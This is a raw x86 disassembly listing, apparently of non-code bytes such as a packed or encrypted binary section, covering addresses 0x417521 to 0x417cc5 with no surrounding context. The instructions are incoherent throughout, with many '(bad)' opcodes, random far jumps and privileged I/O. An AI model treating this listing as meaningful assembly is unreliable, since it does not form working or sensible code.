  417521:	mov    ch,0xba
  417523:	or     dl,ah
  417525:	xor    cl,0x4b
  417528:	test   DWORD PTR [ebx],ecx
  41752a:	(bad)  
  41752b:	scas   eax,DWORD PTR es:[edi]
  41752c:	add    al,0x26
  41752e:	cmp    DWORD PTR [edi-0x7b361079],ebp
  417534:	sbb    al,0xfb
  417536:	ins    DWORD PTR es:[edi],dx
  417537:	pop    esp
  417538:	out    dx,eax
  417539:	ret    
  41753a:	int3   
  41753b:	pop    esi
  41753c:	rcr    DWORD PTR [esi+0x34],1
  41753f:	and    DWORD PTR [edx+0x4b],esi
  417542:	mov    edx,0xf8abf61e
  417547:	cmp    ebx,ebp
  417549:	jmp    0x4ba5de44
  41754e:	mov    ebx,0x8fdec8c1
  417553:	lods   eax,DWORD PTR ds:[esi]
  417554:	pop    ss
  417555:	push   ds
  417556:	pop    esp
  417557:	rcr    DWORD PTR [esi+0xcca2ba],0x64
  41755e:	shr    DWORD PTR [ecx-0x7e0f8508],0x88
  417565:	mov    bl,0x1b
  417567:	xchg   edi,eax
  417568:	es pop edx
  41756a:	cmp    eax,0xcfbd479b
  41756f:	arpl   WORD PTR [ebx],bx
  417571:	(bad)  
  417572:	adc    eax,0x249c4c30
  417577:	fisttp WORD PTR [edi]
  417579:	push   ds
  41757a:	inc    edx
  41757b:	jno    0x4175d2
  41757d:	add    al,0x1d
  41757f:	and    eax,0xd3a77c59
  417584:	imul   eax
  417586:	sbb    edx,edi
  417588:	sbb    ch,BYTE PTR [edi]
  41758a:	cdq    
  41758b:	mov    bl,0xf3
  41758d:	neg    cl
  41758f:	nop
  417590:	fiadd  DWORD PTR [ecx+0x12]
  417593:	jne    0x41757f
  417595:	push   0x99067cfd
  41759a:	aaa    
  41759b:	inc    ecx
  41759c:	mov    ebp,0xf7e18820
  4175a1:	popa   
  4175a2:	push   ecx
  4175a3:	lods   eax,DWORD PTR fs:[esi]
  4175a5:	fst    QWORD PTR [ecx+0x3d0e6d08]
  4175ab:	loopne 0x4175b3
  4175ad:	pop    ecx
  4175ae:	and    eax,0x556d2d01
  4175b3:	lds    ebx,FWORD PTR [ecx+0x43a224da]
  4175b9:	ror    bl,cl
  4175bb:	inc    ebp
  4175bc:	rcr    DWORD PTR [eax],cl
  4175be:	out    dx,eax
  4175bf:	push   esi
  4175c0:	aaa    
  4175c1:	and    edi,DWORD PTR [ebx]
  4175c3:	xor    al,ah
  4175c5:	mov    DWORD PTR [eax+0x443f1925],esi
  4175cb:	dec    eax
  4175cc:	leave  
  4175cd:	sbb    cl,BYTE PTR [ecx-0x6a]
  4175d0:	xor    ch,ah
  4175d2:	enter  0xfe8f,0xa4
  4175d6:	sbb    DWORD PTR [ecx+0x14f91115],ebx
  4175dc:	sbb    ebx,DWORD PTR [edi-0x6fc798c6]
  4175e2:	stos   DWORD PTR es:[edi],eax
  4175e3:	dec    ebx
  4175e4:	cmc    
  4175e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175e6:	mov    DWORD PTR [ecx-0x5c12af80],edi
  4175ec:	rcl    BYTE PTR [edi*8+0x12f636da],0x8d
  4175f4:	repz ret 0xb07c
  4175f8:	arpl   WORD PTR [ebx],si
  4175fa:	mov    dl,0x51
  4175fc:	fyl2x  
  4175fe:	push   ebx
  4175ff:	xor    BYTE PTR [ecx],ch
  417601:	add    DWORD PTR [ebx-0x6f1164b7],ecx
  417607:	pop    esi
  417608:	mov    dh,0xe7
  41760a:	dec    ebp
  41760b:	mov    es,WORD PTR [edi+0x59b07488]
  417611:	dec    esi
  417612:	scas   al,BYTE PTR es:[edi]
  417613:	xor    ch,BYTE PTR [ebp+0x52021a18]
  417619:	and    edx,DWORD PTR [edi+esi*8]
  41761c:	mov    eax,0xbef668a5
  417621:	out    0x5d,eax
  417623:	sub    DWORD PTR [esi],0x8c219222
  417629:	or     al,BYTE PTR [eax-0x68]
  41762c:	dec    edx
  41762d:	push   edx
  41762e:	jns    0x417660
  417630:	add    DWORD PTR [edx-0x3cce6fcd],0x43
  417637:	ret    0xf8b9
  41763a:	xchg   edx,eax
  41763b:	inc    ebp
  41763c:	scas   eax,DWORD PTR es:[edi]
  41763d:	sar    DWORD PTR [edi-0x223f2103],0x92
  417644:	push   es
  417645:	push   edi
  417646:	push   esp
  417647:	ret    0xb7fb
  41764a:	data16 jg 0x417670
  41764d:	aam    0xb3
  41764f:	pop    eax
  417650:	cmp    eax,0x56b7dbad
  417655:	cmp    al,0x4
  417657:	mov    ecx,edx
  417659:	lea    edi,[ebx]
  41765b:	add    al,bh
  41765d:	fwait
  41765e:	fs jg  0x417687
  417661:	cmp    al,0x72
  417663:	bound  ebp,QWORD PTR [eax-0x7e9193d0]
  417669:	mov    cs,WORD PTR ds:0xd7e02b92
  41766f:	or     al,0x0
  417671:	dec    esp
  417672:	and    ebx,ebp
  417674:	or     DWORD PTR [edx],0xffd2d4cb
  41767a:	ins    DWORD PTR es:[edi],dx
  41767b:	out    0x42,eax
  41767d:	jae    0x417668
  41767f:	icebp  
  417680:	xchg   ebp,eax
  417681:	add    al,0x1
  417683:	scas   al,BYTE PTR es:[edi]
  417684:	xor    DWORD PTR [edx+0x44],esi
  417687:	inc    eax
  417688:	sbb    edx,ebx
  41768a:	or     eax,0xebcb5e1e
  41768f:	pop    eax
  417690:	popa   
  417691:	ret    
  417692:	inc    esi
  417693:	or     eax,0xa1f90b11
  417698:	int3   
  417699:	push   ebx
  41769a:	or     BYTE PTR [ecx+edx*2],bl
  41769d:	push   esi
  41769e:	rol    DWORD PTR [ebx],1
  4176a0:	mov    edi,0xe0ba02a8
  4176a5:	add    dl,BYTE PTR ds:0xf23aabdc
  4176ab:	xor    dl,cl
  4176ad:	dec    esp
  4176ae:	jb     0x417663
  4176b0:	push   ebp
  4176b1:	stos   DWORD PTR es:[edi],eax
  4176b2:	pop    edi
  4176b3:	lods   eax,DWORD PTR ds:[esi]
  4176b4:	and    ebx,DWORD PTR [ebx+esi*2-0x25825611]
  4176bb:	mov    ds:0xf33a07e3,al
  4176c0:	fsub   DWORD PTR [eax]
  4176c2:	dec    ebp
  4176c3:	xchg   ebx,eax
  4176c4:	jbe    0x4176c0
  4176c6:	aad    0xb7
  4176c8:	push   eax
  4176c9:	mov    edx,DWORD PTR [eax]
  4176cb:	ret    
  4176cc:	mov    esp,0xf3357ecb
  4176d1:	sbb    ebp,ebx
  4176d3:	sbb    al,BYTE PTR [ebp+0x212eb30a]
  4176d9:	out    0x9f,eax
  4176db:	(bad)  
  4176dc:	fs in  eax,0x73
  4176df:	retf   0xb856
  4176e2:	cmp    al,0xac
  4176e4:	les    ebp,FWORD PTR [esi]
  4176e6:	in     eax,dx
  4176e7:	loopne 0x4176f9
  4176e9:	(bad)  
  4176ea:	jp     0x41766d
  4176ec:	add    bl,BYTE PTR [eax]
  4176ee:	pop    ebx
  4176ef:	rcl    ch,cl
  4176f1:	xor    eax,0x8741dae1
  4176f6:	int3   
  4176f7:	add    esp,esi
  4176f9:	jmp    0x7919:0x471d43c6
  417700:	jmp    0x59b1b789
  417705:	popf   
  417706:	iret   
  417707:	arpl   WORD PTR [esp+esi*1-0x523ac108],bp
  41770e:	jns    0x4176ce
  417710:	xor    dl,BYTE PTR [edx-0x3a55432f]
  417716:	retf   0x2921
  417719:	jp     0x417783
  41771b:	dec    ecx
  41771c:	or     al,0x2e
  41771e:	je     0x41770c
  417720:	push   ss
  417721:	push   edx
  417722:	pop    esi
  417723:	mov    dh,0x67
  417725:	sahf   
  417726:	shr    DWORD PTR [ecx+0x1f7ce535],1
  41772c:	mov    al,ds:0x1cd48a7d
  417731:	bound  esp,QWORD PTR [ebx]
  417733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417734:	mov    edi,0x81536dc2
  417739:	retf   
  41773a:	mov    DWORD PTR [ebp-0x2cfc76dc],esi
  417740:	repnz aad 0xd4
  417743:	sar    eax,1
  417745:	imul   ebx,DWORD PTR [ecx],0xffffffb4
  417748:	lahf   
  417749:	fs aaa 
  41774b:	dec    esp
  41774c:	int3   
  41774d:	jmp    0x417795
  41774f:	retw   0xd7d0
  417753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417754:	in     al,0x55
  417756:	jle    0x4177d7
  417758:	les    eax,FWORD PTR [ecx]
  41775a:	push   ds
  41775b:	out    dx,al
  41775c:	mov    esi,0xef5c4b3
  417761:	in     al,dx
  417762:	(bad)  
  417763:	into   
  417764:	jno    0x417796
  417766:	jp     0x417732
  417768:	xchg   esi,eax
  417769:	pop    esp
  41776a:	mov    ds,WORD PTR [ebp-0x36]
  41776d:	add    cl,BYTE PTR [eax-0x1a]
  417770:	xlat   BYTE PTR cs:[ebx]
  417772:	or     BYTE PTR [edx-0x75],ah
  417775:	jmp    0x2e23:0xbf29001
  41777c:	mov    esp,0x451ff60
  417781:	addr16 xor eax,0x78ef7bb1
  417787:	push   ebx
  417788:	dec    ecx
  417789:	lods   al,BYTE PTR ds:[esi]
  41778a:	dec    ebx
  41778b:	rcl    DWORD PTR [esi],0xbf
  41778e:	mov    cl,0xda
  417790:	mov    edx,0xff512494
  417795:	lidtd  [edx]
  417798:	jno    0x41776f
  41779a:	stos   DWORD PTR es:[edi],eax
  41779b:	js     0x417791
  41779d:	jbe    0x4177bc
  41779f:	iret   
  4177a0:	or     BYTE PTR [ecx+0x3e],al
  4177a3:	ss pop edx
  4177a5:	dec    ecx
  4177a6:	repnz hlt 
  4177a8:	mov    ah,BYTE PTR [ebx-0x5b]
  4177ab:	mov    ebx,0x1bfc3baf
  4177b1:	lock pop ebp
  4177b3:	push   ecx
  4177b4:	sbb    al,0xa2
  4177b6:	out    0x15,eax
  4177b8:	sub    dh,BYTE PTR [eax+0x66c389db]
  4177be:	(bad)  
  4177bf:	pop    edi
  4177c0:	dec    ebx
  4177c1:	sbb    DWORD PTR [esi],ebp
  4177c3:	jns    0x417824
  4177c5:	push   edi
  4177c6:	fimul  DWORD PTR es:[esi-0x52]
  4177ca:	sbb    eax,0xbbc2b8b7
  4177cf:	xchg   esi,eax
  4177d0:	(bad)  
  4177d1:	xchg   ebp,eax
  4177d2:	and    al,BYTE PTR [esp+esi*4]
  4177d5:	cmc    
  4177d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177d7:	in     al,dx
  4177d8:	mov    BYTE PTR [esi],0x92
  4177db:	sbb    bl,BYTE PTR es:[ebp+ebp*8-0x669dd6e8]
  4177e3:	fucomi st,st(2)
  4177e5:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4177e7:	cli    
  4177e8:	jne    0x417795
  4177ea:	int    0xcd
  4177ec:	ins    BYTE PTR es:[edi],dx
  4177ed:	xlat   BYTE PTR ds:[ebx]
  4177ee:	ins    BYTE PTR es:[edi],dx
  4177ef:	push   ecx
  4177f0:	pop    ebx
  4177f1:	imul   ebx,DWORD PTR [ecx-0x19],0xffffffb0
  4177f5:	lds    ebp,FWORD PTR [ebx]
  4177f7:	int    0x42
  4177f9:	dec    eax
  4177fa:	xor    DWORD PTR [esi-0x517ba670],0xfffffff2
  417801:	sbb    ebp,DWORD PTR [ecx+0xd82cb33]
  417807:	sub    DWORD PTR [ebp+ecx*8+0x76],0xbdcdeff7
  41780f:	and    DWORD PTR [esi-0x628a1a44],edi
  417815:	jmp    0x417797
  417817:	jp     0x4177f0
  417819:	mov    bl,0xf3
  41781b:	stc    
  41781c:	sub    al,BYTE PTR [ebx+0x53e1fc31]
  417822:	dec    ebp
  417823:	retf   
  417824:	push   ebx
  417825:	jmp    0xd2df:0xae24e655
  41782c:	out    dx,eax
  41782d:	cmc    
  41782e:	add    DWORD PTR [esi+esi*1+0x50],ecx
  417832:	cmp    al,0x18
  417834:	out    0xd5,eax
  417836:	pop    es
  417837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417838:	in     al,0xe5
  41783a:	fsub   QWORD PTR [esi+0x26fc48bf]
  417840:	jb     0x41785b
  417842:	pop    es
  417843:	aad    0x5c
  417845:	jb     0x4178b5
  417847:	cmp    dh,BYTE PTR [eax+ebp*4]
  41784a:	shl    BYTE PTR [edx],0xd0
  41784d:	jmp    0x30e8820c
  417852:	test   eax,0x92df680e
  417857:	mov    ch,0xe8
  417859:	or     DWORD PTR [eax+0x31],esi
  41785c:	mov    ecx,0x72c7afc8
  417861:	pop    edi
  417862:	xor    al,0x38
  417864:	mov    DWORD PTR [ebx],ecx
  417866:	xor    BYTE PTR [edi+esi*1],0x4c
  41786a:	cmp    dl,bl
  41786c:	push   es
  41786d:	jecxz  0x41784b
  41786f:	inc    ebp
  417870:	dec    edx
  417871:	mov    DWORD PTR [edi-0x1bbf62bc],ebp
  417877:	mov    bh,0xe6
  417879:	jmp    0x4178f1
  41787b:	adc    edx,eax
  41787d:	les    edi,FWORD PTR [edx-0x3c6f36ba]
  417883:	hlt    
  417884:	jg     0x4178d4
  417886:	cmc    
  417887:	add    DWORD PTR [ebp+0x6cd87916],ecx
  41788d:	mov    edx,0x9844169f
  417892:	jnp    0x41788d
  417894:	push   edi
  417895:	dec    edx
  417896:	push   esi
  417897:	xor    eax,DWORD PTR [edi+0x60a40728]
  41789d:	imul   ebp,DWORD PTR [esi],0xffffff9b
  4178a0:	pop    eax
  4178a1:	and    BYTE PTR [edi+0xe1c9325],0xc4
  4178a8:	xor    bl,cl
  4178aa:	inc    esi
  4178ab:	dec    esi
  4178ac:	push   esi
  4178ad:	pop    es
  4178ae:	clc    
  4178af:	je     0x417926
  4178b1:	push   ecx
  4178b2:	call   0x2abc:0x50dd5f90
  4178b9:	inc    esp
  4178ba:	cmp    ah,BYTE PTR [edx]
  4178bc:	xchg   ecx,eax
  4178bd:	xchg   edx,eax
  4178be:	or     esi,esp
  4178c0:	ds jl  0x4178bb
  4178c3:	sub    bl,BYTE PTR [esi]
  4178c5:	lock mov ebx,0x617e1cd7
  4178cb:	sbb    al,0xae
  4178cd:	(bad)  
  4178ce:	(bad)  
  4178cf:	fdivr  DWORD PTR [esi-0x133f896a]
  4178d5:	or     ecx,DWORD PTR [edi-0x44]
  4178d8:	aaa    
  4178d9:	aam    0xa4
  4178db:	test   eax,0xa2998357
  4178e0:	inc    ebp
  4178e1:	jno    0x41793c
  4178e3:	push   esp
  4178e4:	mov    DWORD PTR [ecx-0x45c3e4b7],ebp
  4178ea:	lods   eax,DWORD PTR ds:[esi]
  4178eb:	xchg   ebx,esp
  4178ed:	loopne 0x41794c
  4178ef:	out    0xbf,al
  4178f1:	mov    ebp,0xdb7b1819
  4178f6:	adc    DWORD PTR ds:0x4ed019a1,edx
  4178fc:	add    dl,BYTE PTR [edi-0xd1df371]
  417902:	push   ds
  417903:	arpl   WORD PTR [esi-0x1e],bx
  417906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417907:	scas   eax,DWORD PTR es:[edi]
  417908:	mov    bl,0x7b
  41790a:	and    dh,BYTE PTR [edx]
  41790c:	fsubr  st(2),st
  41790e:	clc    
  41790f:	aad    0xb6
  417911:	mov    al,ds:0xbb1755e3
  417916:	scas   eax,DWORD PTR es:[edi]
  417917:	sbb    ch,BYTE PTR [ecx]
  417919:	rcr    BYTE PTR [ecx+ebx*8],cl
  41791c:	jmp    0x417927
  41791e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41791f:	ja     0x4178e5
  417921:	test   al,0x5d
  417923:	push   edx
  417924:	loope  0x4178b7
  417926:	cmp    edi,DWORD PTR [esi-0x2b]
  417929:	in     eax,dx
  41792a:	xchg   ebp,eax
  41792b:	shl    bl,0x5f
  41792e:	mov    eax,DWORD PTR [ebx+eiz*4-0x5a183696]
  417935:	pop    esi
  417936:	mov    ebx,0xe4522b47
  41793b:	mov    al,ds:0x14771168
  417940:	stos   DWORD PTR es:[edi],eax
  417941:	dec    ebp
  417942:	or     eax,0xdc65ba73
  417947:	(bad)  
  417948:	cmc    
  417949:	mov    bh,0x60
  41794b:	add    al,0x8c
  41794d:	jle    0x417923
  41794f:	inc    edx
  417950:	stos   DWORD PTR es:[edi],eax
  417951:	ja     0x4179c5
  417953:	fsubr  QWORD PTR [ebx+0x276c36a3]
  417959:	xor    dh,BYTE PTR [esi+0x261b440b]
  41795f:	cld    
  417960:	imul   ecx,DWORD PTR [edi+0x41],0x3f739a08
  417967:	into   
  417968:	test   al,0x7
  41796a:	inc    ebx
  41796b:	xor    esp,ebp
  41796d:	inc    eax
  41796e:	scas   al,BYTE PTR es:[edi]
  41796f:	pop    es
  417970:	xchg   BYTE PTR [ebx-0x788abc0b],dl
  417976:	stc    
  417977:	push   edx
  417978:	test   DWORD PTR [ebx-0x1d],esi
  41797b:	(bad)
  41797e:	dec    esp
  41797f:	adc    al,0x52
  417981:	repnz and BYTE PTR [edx],ch
  417984:	int3   
  417985:	or     eax,0x7f42e739
  41798a:	out    0xe9,al
  41798c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41798d:	mov    ds:0x8b6ad5d3,eax
  417992:	sbb    BYTE PTR [eax+edx*4],cl
  417995:	xor    ah,BYTE PTR [eax+0x8b8e0e4]
  41799b:	add    dl,ah
  41799d:	sub    esp,edx
  41799f:	or     DWORD PTR [ebx+0x363124fd],ebp
  4179a5:	cs out 0xa2,al
  4179a8:	jmp    0xc22e:0xd8afb472
  4179af:	das    
  4179b0:	fmul   DWORD PTR [ecx-0x50d8b71f]
  4179b6:	cmp    DWORD PTR [edx+0x7afba975],edx
  4179bc:	jno    0x4179b0
  4179be:	jno    0x417a0d
  4179c0:	pop    es
  4179c1:	add    al,0xe
  4179c3:	shl    ch,0xa
  4179c6:	dec    esp
  4179c7:	xchg   ecx,eax
  4179c8:	jno    0x4179f4
  4179ca:	cmp    esi,0x5e
  4179cd:	ret    
  4179ce:	jno    0x417972
  4179d0:	xchg   dl,al
  4179d2:	frstor [ebx]
  4179d4:	cld    
  4179d5:	aas    
  4179d6:	ins    DWORD PTR es:[edi],dx
  4179d7:	test   al,0x3f
  4179d9:	adc    dh,BYTE PTR [eax+0x654174f7]
  4179df:	cmp    DWORD PTR [ecx],ecx
  4179e1:	das    
  4179e2:	jl     0x4179c4
  4179e4:	mov    ch,0xa6
  4179e6:	popf   
  4179e7:	inc    ebp
  4179e8:	sub    eax,0xbe21b454
  4179ed:	xchg   ebp,eax
  4179ee:	xchg   DWORD PTR [edx],esi
  4179f0:	mov    ah,0xca
  4179f2:	sbb    eax,0xaf106860
  4179f7:	mov    ds:0xaf0871ed,eax
  4179fc:	nop
  4179fd:	not    bl
  4179ff:	xchg   DWORD PTR [edx],ebx
  417a01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a02:	out    0x97,al
  417a04:	fs push esi
  417a06:	mov    ebp,DWORD PTR [eax]
  417a08:	sar    DWORD PTR [ebp+0x7be09d07],1
  417a0e:	mov    ?,WORD PTR [edi+0x79a081a7]
  417a14:	pop    es
  417a15:	sahf   
  417a16:	vshufpd ymm6,ymm0,YMMWORD PTR [eax],0xfb
  417a1b:	idiv   DWORD PTR [edx+0x23]
  417a1e:	lods   al,BYTE PTR ds:[esi]
  417a1f:	enter  0xfe2,0x43
  417a23:	mov    ebp,0x6857a490
  417a28:	loop   0x417a80
  417a2a:	or     eax,0x5b5522bc
  417a2f:	mov    WORD PTR [ecx+ebp*4-0x7f],cs
  417a33:	mov    dh,BYTE PTR [esi+0x36]
  417a36:	sahf   
  417a37:	mov    esp,0xa0a10261
  417a3c:	dec    eax
  417a3d:	aam    0x40
  417a3f:	out    0x86,eax
  417a41:	add    al,BYTE PTR [ebp-0x4c4215fb]
  417a47:	dec    ecx
  417a48:	add    al,0x1f
  417a4a:	sbb    ah,BYTE PTR ds:0xb1a446d6
  417a50:	div    esp
  417a52:	cmc    
  417a53:	je     0x4179e6
  417a55:	mov    bh,0x7a
  417a57:	retf   
  417a58:	hlt    
  417a59:	cdq    
  417a5a:	fimul  WORD PTR [ecx]
  417a5c:	imul   ecx,ebp,0xffffff92
  417a5f:	mov    DWORD PTR [edi],esp
  417a61:	cmp    DWORD PTR [edi+0xd841454],esi
  417a67:	push   edi
  417a68:	or     DWORD PTR [edx-0x20818db8],eax
  417a6e:	xchg   edi,eax
  417a6f:	and    BYTE PTR [edi],al
  417a71:	lahf   
  417a72:	pusha  
  417a73:	or     bl,BYTE PTR [eax+0x4b]
  417a76:	xor    eax,0x63298cc5
  417a7b:	retf   
  417a7c:	cmp    eax,DWORD PTR [edi]
  417a7e:	push   cs
  417a7f:	xchg   DWORD PTR [ebx+0x2971abe6],edi
  417a85:	xor    al,0x80
  417a87:	dec    ebx
  417a88:	mov    ds:0xca3bb47a,al
  417a8d:	cmp    al,0x8f
  417a8f:	xchg   edi,eax
  417a90:	fist   DWORD PTR ds:0xffb8ec29
  417a96:	mov    ebp,0xcd1c0675
  417a9b:	(bad)  
  417a9c:	imul   ebp,edi,0xffffff94
  417a9f:	and    edi,DWORD PTR [esi+0x7d]
  417aa2:	lods   al,BYTE PTR ds:[esi]
  417aa3:	inc    esi
  417aa4:	xor    BYTE PTR [esi],dl
  417aa6:	dec    edi
  417aa7:	add    al,0x98
  417aa9:	sub    BYTE PTR [edi-0x7fe5cd01],al
  417aaf:	cld    
  417ab0:	in     eax,dx
  417ab1:	add    BYTE PTR [ebx],dh
  417ab3:	scas   al,BYTE PTR es:[edi]
  417ab4:	adc    ebp,edi
  417ab6:	cs inc esp
  417ab8:	aaa    
  417ab9:	ret    0xbef4
  417abc:	mov    esp,0xb1d0536d
  417ac1:	or     ecx,DWORD PTR [ebx-0x5083fde6]
  417ac7:	rcl    dl,1
  417ac9:	inc    esp
  417aca:	jecxz  0x417b20
  417acc:	bound  eax,QWORD PTR [esi+0x34e6c4b1]
  417ad2:	mov    cl,0x8d
  417ad4:	je     0x417aac
  417ad6:	fbld   TBYTE PTR [esi]
  417ad8:	aam    0x6b
  417ada:	xchg   esp,eax
  417adb:	aas    
  417adc:	mov    eax,ds:0xe527c017
  417ae1:	sti    
  417ae2:	hlt    
  417ae3:	fiadd  WORD PTR [ebx+0x4c9f193f]
  417ae9:	into   
  417aea:	mov    bh,0x3
  417aec:	mov    ?,WORD PTR [ebp+0x58]
  417aef:	stos   DWORD PTR es:[edi],eax
  417af0:	adc    BYTE PTR [edx+eiz*4-0x434fb150],ch
  417af7:	scas   eax,DWORD PTR es:[edi]
  417af8:	mov    al,ds:0x35cc65
  417afd:	sahf   
  417afe:	xchg   ecx,ebx
  417b00:	xor    ecx,eax
  417b02:	sub    eax,0x83bca256
  417b07:	(bad)  
  417b08:	mov    bh,0xf5
  417b0a:	or     ecx,esi
  417b0c:	sahf   
  417b0d:	or     cl,BYTE PTR [ebx+0x37b9bed8]
  417b13:	ds jp  0x417ac0
  417b16:	(bad)  ds:0x6c7c47f2
  417b1c:	and    bh,ah
  417b1e:	in     al,0xb
  417b20:	enter  0xfba,0xe9
  417b24:	fist   WORD PTR [ebx+0x76b830b1]
  417b2a:	xchg   BYTE PTR [edx],ch
  417b2c:	iret   
  417b2d:	jl     0x417b62
  417b2f:	sbb    al,0x8f
  417b31:	jns    0x417af1
  417b33:	cmp    DWORD PTR ds:0x26417714,eax
  417b39:	mov    dl,0xd3
  417b3b:	or     dh,dl
  417b3d:	sub    BYTE PTR [esi],ah
  417b3f:	fnstsw WORD PTR [eax-0x57]
  417b42:	xchg   ebx,eax
  417b43:	in     eax,0xe0
  417b45:	xchg   esp,eax
  417b46:	sub    al,0x95
  417b48:	pop    esi
  417b49:	enter  0x2eea,0xe9
  417b4d:	mov    ecx,0x5c5d331f
  417b52:	icebp  
  417b53:	std    
  417b54:	mov    edi,0x29ade3bd
  417b59:	pop    esi
  417b5a:	pop    ecx
  417b5b:	aam    0x43
  417b5d:	sbb    DWORD PTR ds:0x82d73ee2,eax
  417b63:	hlt    
  417b64:	sbb    DWORD PTR [ecx+0x32c2f2ea],ecx
  417b6a:	outs   dx,BYTE PTR ds:[esi]
  417b6b:	sub    al,0xdd
  417b6d:	jbe    0x417bbb
  417b6f:	fnstenv [ebx+ecx*4]
  417b72:	stc    
  417b73:	or     bl,dl
  417b75:	fnsave [eax]
  417b77:	(bad)  
  417b78:	mov    edi,0x58d4f0f
  417b7d:	ja     0x417b1d
  417b7f:	xchg   esp,eax
  417b80:	lods   eax,DWORD PTR ds:[esi]
  417b81:	jl     0x417b23
  417b83:	or     DWORD PTR [ebx-0x77],eax
  417b86:	div    edx
  417b88:	call   0x8d94e447
  417b8d:	aaa    
  417b8e:	or     ebx,esp
  417b90:	push   esp
  417b91:	jno    0x417b2a
  417b93:	sti    
  417b94:	mov    bl,0x5a
  417b96:	mov    ebp,ebp
  417b98:	cmp    DWORD PTR [ebp+0x6e],0xffffffdd
  417b9c:	push   ebx
  417b9d:	mov    BYTE PTR [eax],ch
  417b9f:	jb     0x417c03
  417ba1:	inc    esi
  417ba2:	lahf   
  417ba3:	mov    edi,0x6449eaeb
  417ba8:	js     0x417b3b
  417baa:	loope  0x417bdd
  417bac:	cmp    al,0x5e
  417bae:	ja     0x417c2a
  417bb0:	push   esp
  417bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bb2:	add    edi,0x33
  417bb5:	xor    BYTE PTR [edx-0x4a],bl
  417bb8:	loop   0x417b98
  417bba:	cmp    eax,0xa2bfc88e
  417bbf:	bound  ecx,QWORD PTR [esp+ebp*1-0x71a27f4b]
  417bc6:	xor    edi,DWORD PTR [esi-0x4f]
  417bc9:	rol    BYTE PTR [ebp+0x7cdea221],0x55
  417bd0:	popa   
  417bd1:	dec    esi
  417bd2:	cmp    BYTE PTR [esi+0x46c99d1e],bh
  417bd8:	sbb    esp,esi
  417bda:	xchg   esi,eax
  417bdb:	mov    dl,BYTE PTR [edi-0x2d]
  417bde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bdf:	les    ebp,FWORD PTR [ebx]
  417be1:	outs   dx,DWORD PTR ds:[esi]
  417be2:	fcomi  st,st(1)
  417be4:	jns    0x417c3e
  417be6:	sbb    ah,dl
  417be8:	js     0x417c29
  417bea:	test   al,0xb8
  417bec:	inc    ebx
  417bed:	jmp    0x417b8a
  417bef:	inc    eax
  417bf0:	dec    ebx
  417bf1:	xchg   esi,eax
  417bf2:	jmp    0xfc18eeaa
  417bf7:	push   edx
  417bf8:	lods   al,BYTE PTR ds:[esi]
  417bf9:	fwait
  417bfa:	mov    bl,0x27
  417bfc:	xchg   ah,bh
  417bfe:	pop    esi
  417bff:	push   eax
  417c00:	cs repz (bad) 
  417c04:	test   al,0x5b
  417c06:	sub    ebx,DWORD PTR [edx-0x2580cc56]
  417c0c:	cld    
  417c0d:	outs   dx,DWORD PTR ds:[esi]
  417c0e:	sub    DWORD PTR [ecx-0x48],esp
  417c11:	mov    ecx,DWORD PTR [edx]
  417c13:	push   edx
  417c14:	fwait
  417c15:	push   esp
  417c16:	push   edx
  417c17:	xchg   ebx,eax
  417c18:	nop
  417c19:	sbb    ebx,DWORD PTR [ecx+0x341b1c7c]
  417c1f:	js     0x417bc9
  417c21:	outs   dx,DWORD PTR ds:[esi]
  417c22:	adc    eax,0xc49d2d8e
  417c27:	arpl   WORD PTR [ecx+edx*2-0x43],bp
  417c2b:	jno    0x417c4d
  417c2d:	or     dh,bl
  417c2f:	shl    BYTE PTR [ecx-0x2a],0xf5
  417c33:	mov    cl,0xd1
  417c35:	out    dx,al
  417c36:	jmp    0x417c1b
  417c38:	jmp    0x689744d
  417c3d:	and    DWORD PTR [bx+di-0x40ca],edi
  417c42:	leave  
  417c43:	out    0xd7,al
  417c45:	cmp    DWORD PTR [esi-0x46aefc23],esp
  417c4b:	outs   dx,DWORD PTR ds:[esi]
  417c4c:	(bad)  
  417c4d:	loopne 0x417bf2
  417c4f:	xor    ax,0xaf0d
  417c53:	je     0x417bfb
  417c55:	mov    DWORD PTR [edx+ecx*4-0x5c],0xb2ff1020
  417c5d:	ficomp WORD PTR [esi]
  417c5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c60:	ffreep st(0)
  417c62:	mov    BYTE PTR [eax],cl
  417c64:	aad    0xce
  417c66:	(bad)  
  417c67:	out    0x30,al
  417c69:	stos   DWORD PTR es:[edi],eax
  417c6a:	mov    esi,0xa50d9f77
  417c6f:	sbb    al,0xd0
  417c71:	mov    eax,0xec12cf9e
  417c76:	sti    
  417c77:	sub    ebp,ebx
  417c79:	adc    al,bh
  417c7b:	stc    
  417c7c:	jns    0x417ccd
  417c7e:	sbb    al,0x7f
  417c80:	repz cmp dl,BYTE PTR [eax+0x16f1343f]
  417c87:	addr16 aam 0x99
  417c8a:	push   ds
  417c8b:	xlat   BYTE PTR ds:[ebx]
  417c8c:	aad    0x77
  417c8e:	push   edx
  417c8f:	aaa    
  417c90:	fild   QWORD PTR [ebx+0x78]
  417c93:	sbb    al,0x90
  417c95:	xchg   BYTE PTR [esi+ecx*8+0x7c],dh
  417c99:	pusha  
  417c9a:	bound  ebp,QWORD PTR [ecx+0x49]
  417c9d:	pop    ebp
  417c9e:	xchg   DWORD PTR [eax],eax
  417ca0:	fiadd  DWORD PTR [edi-0x4712906c]
  417ca6:	nop
  417ca7:	push   ecx
  417ca8:	das    
  417ca9:	fwait
  417caa:	sub    eax,0x78d17873
  417caf:	imul   ebp,DWORD PTR [edx],0xffffffaf
  417cb2:	outs   dx,BYTE PTR ds:[esi]
  417cb3:	fdivr  QWORD PTR [ebp+ebx*2-0x3fa3c431]
  417cba:	sbb    BYTE PTR [edi-0x22d7a7e8],dl
  417cc0:	fsubr  st,st(2)
  417cc2:	int3   
  417cc3:	xchg   ebx,eax
  417cc4:	push   eax
  417cc5:	jl     0x417d10
